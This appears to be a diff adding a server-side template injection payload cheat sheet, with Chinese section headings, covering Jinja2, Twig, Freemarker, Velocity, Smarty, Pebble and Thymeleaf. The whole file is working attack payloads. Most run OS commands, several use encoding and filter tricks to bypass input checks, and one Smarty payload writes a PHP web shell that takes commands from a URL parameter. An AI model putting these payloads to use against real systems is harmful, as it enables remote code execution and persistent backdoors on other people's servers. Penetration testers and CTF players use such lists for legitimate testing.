@@ -1,0 +1,57 @@
+# 奇葩 SSTI 绕过
+# Jinja2 无引号
+{{lipsum.__globals__["os"].popen("id").read()}}
+{{lipsum.__globals__.os.popen(request.args.cmd).read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Jinja2 过滤器绕过
+{{()|attr('\x5f\x5fclass\x5f\x5f')}}
+{{''|attr('__class__')}}
+{{''|attr('\x5f\x5fclass\x5f\x5f')}}
+{%set a='__cla'+'ss__'%}{{''|attr(a)}}
+
+# Jinja2 下划线绕过
+{{''['\x5f\x5fclass\x5f\x5f']}}
+{{''['\137\137class\137\137']}}
+{{()|attr('\137\137class\137\137')}}
+{%set x='\x5f\x5f'%}{{''[x+'class'+x]}}
+
+# Jinja2 点绕过
+{{''['__class__']['__mro__'][1]['__subclasses__']()}}
+{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}
+
+# Jinja2 数字绕过
+{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(True)}}
+{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(-True)}}
+
+# Twig 绕过
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
+{{app.request.server.all|join}}
+
+# Freemarker 绕过
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+
+# Velocity 绕过
+#set($x='')##
+#set($rt=$x.class.forName('java.lang.Runtime'))##
+#set($chr=$x.class.forName('java.lang.Character'))##
+#set($str=$x.class.forName('java.lang.String'))##
+#set($ex=$rt.getRuntime().exec('id'))##
+
+# Smarty 绕过
+{$smarty.version}
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# Pebble 绕过
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+
+# Thymeleaf 绕过
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
